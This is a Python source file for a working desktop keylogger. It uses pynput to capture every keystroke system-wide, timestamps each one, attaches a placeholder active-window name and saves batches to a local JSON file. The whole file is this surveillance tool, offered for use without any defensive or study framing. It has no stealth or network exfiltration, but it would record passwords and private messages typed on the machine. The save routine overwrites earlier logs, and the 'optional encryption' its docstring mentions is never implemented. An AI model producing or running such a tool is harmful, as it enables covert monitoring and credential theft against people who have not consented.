import os
import sys
import time
import json
import platform
from pynput import keyboard
from datetime import datetime

class DesktopKeylogger:
    def __init__(self, log_file='keylog.json'):
        """
        Initialize the keylogger with configurable log file
        """
        self.log_file = log_file
        self.logs = []
        self.active_window = None
        
    def on_press(self, key):
        """
        Capture keystrokes and log them with timestamp and active window
        """
        try:
            # Get current timestamp
            timestamp = datetime.now().isoformat()
            
            # Convert key to readable string
            key_str = str(key).replace("'", "")
            
            # Log the keystroke
            log_entry = {
                'timestamp': timestamp,
                'key': key_str,
                'active_window': self.get_active_window()
            }
            
            self.logs.append(log_entry)
            
            # Optional: Save logs periodically or on certain conditions
            if len(self.logs) >= 10:
                self.save_logs()
                
        except Exception as e:
            print(f"Error logging keystroke: {e}")
    
    def get_active_window(self):
        """
        Get the currently active window 
        Platform-specific implementation
        """
        # TODO: Implement platform-specific window tracking
        # For macOS: Use AppKit
        # For Windows: Use win32gui
        return "Unknown Window"
    
    def save_logs(self, force=False):
        """
        Save logs to JSON file with optional encryption
        """
        try:
            with open(self.log_file, 'w') as f:
                json.dump(self.logs, f, indent=2)
            
            # Reset logs after saving
            self.logs = []
        except Exception as e:
            print(f"Error saving logs: {e}")
    
    def start_logging(self):
        """
        Start the keylogger
        """
        print("Keylogger started...")
        
        # Start listening to keyboard events
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def main():
    keylogger = DesktopKeylogger()
    keylogger.start_logging()

if __name__ == "__main__":
    main() 